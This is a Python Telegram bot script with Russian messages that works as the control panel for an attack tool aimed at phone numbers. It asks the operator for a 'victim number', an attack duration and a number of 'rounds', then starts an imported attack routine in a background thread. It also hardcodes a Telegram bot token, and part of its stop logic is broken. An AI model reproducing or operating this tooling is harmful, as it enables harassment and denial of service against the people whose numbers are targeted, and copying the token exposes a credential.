# -*- coding: utf-8 -*-
# Import modules
import start_attack
import help
import run_bot
import threading
import sys
import telebot
import os



bot = telebot.TeleBot("1884845165:AAE51LVnKOW2_tmgXyCpsC1nu-a-JXIYBuc")

"""###################################################################################################################
#Подключаем прокси
#	proxy.proxy()
################################################################################################################## """

try:
	@bot.message_handler(commands=['Start'])  # Обработка команд
	def send_start(message):
		print('Подключился новый клиент')
		bot.send_message(message.chat.id, "Введите номер жертвы в формате - \"+7**********\"")
		bot.register_next_step_handler(message, send_number)

	@bot.message_handler(commands=['Stop'])  # Обработка команд
	def send_stop(message):
		bot.send_message(message.chat.id, "Для продолжения и выбора следующей цели введите /Start")
		os.kill(p1.pid, signal.SIGINT)


	@bot.message_handler(commands=['Help'])
	def send_help(message):
		bot.send_message(message.chat.id, help.h())


	@bot.message_handler(commands=['Attack'])  # Запускает impulse по команде
	def send_attack(message):
		global p1
		bot.send_message(message.chat.id, "Атака началась \nЧто бы прервать введите /Stop")

		# запускаем дочерний демонический процесс, который будет выполнять аттаку
		p1 = threading.Thread(target=start_attack.sa, daemon=True, name="t1", args=[par_time, par_threads, par_number] )
		p1.start()
		print(p1)
		# Проверяем  выполнение атаки p1 = threading.Thread(target=proc, daemon=True, name="t1", args=[])
		while p1.is_alive() :
			continue
		else:
			bot.send_message(message.chat.id, "Атака завершена. \nЧто бы выбрать другую цель введите \n/Start")

# Обработка сообщений

	@bot.message_handler(content_types=['text'])
	def start(message):
		global message_id
		message_id = message.chat.id
		if message.text == "/Restart":
			bot.register_next_step_handler(message, send_start)
		elif message.text == '/reg':
			bot.send_message(message.chat.id, "Приветствую. Для получения справки введите команду \n/Help")
		else:
			bot.send_message(message.chat.id, "Неизвестная команда, введите команду \n/Help")

# Получение парамметров необходимых для запуска impulse

	def send_number(message):
		global par_number, message_id
		message_id = message.chat.id
		par_number = message.text
		if message.text == "/Restart":
			bot.register_next_step_handler(message, send_start)
		elif par_number[0:2] == '+7' and len(par_number) == 12 and par_number[1:12].isdigit() == True: #Проверка на правильность ввода номера
			bot.send_message(message.chat.id, "Номер жертвы - " + par_number + "\nВведите продолжительность атаки в секундах \ntime = ")
			bot.register_next_step_handler(message, send_time)
		else:
			bot.send_message(message.chat.id, 'Неверный формат номера')
			bot.register_next_step_handler(message, send_number)

	def send_time(message):
		global par_number, par_time, message_id
		message_id = message.chat.id
		par_time = message.text
		if message.text == "/Restart":
			bot.register_next_step_handler(message, send_start)
		elif par_time.isdigit() == True: #Время в пределах 24х часов
			if 0 <= int(par_time) <= 100000:
				bot.send_message(message.chat.id, "Номер жертвы - "+ par_number + "\ntime = " + par_time + "\nВведите количество кругов атаки \nthreads = ")
				bot.register_next_step_handler(message, send_threads)
		else:
			bot.send_message(message.chat.id, "Неверно введено время")
			bot.register_next_step_handler(message, send_time)

	def send_threads(message):
		global par_number, par_time, par_threads, message_id
		message_id = message.chat.id
		par_threads = message.text
		if message.text == "/Restart":
			bot.register_next_step_handler(message, send_start)
		elif par_threads.isdigit() == True:
			if 1 <= int(par_threads) < 200:
				bot.send_message(message.chat.id, "Номер жертвы - "+ par_number + "\ntime = " + par_time + "\nthreads = " + par_threads + "\nЧтобы начать атаку введите \n/Attack")
				print("Номер жертвы - "+ par_number + "\ntime = " + par_time + "\nthreads = " + par_threads)
		else:
			bot.send_message(message.chat.id, "Неверное число кругов")
			bot.register_next_step_handler(message, send_threads)
	bot.polling( none_stop = True)

# Обрвботка исключений

except Exception:
	global message_id
	print('Возникла ошибка, бот перезапущен')
	bot.send_message(message_id, "Вы ввели неверные параметры и возникла ошибка, бот был перезапущен. \nДля начала работы введите /Start")
	run_bot.start()

##################################################################################################


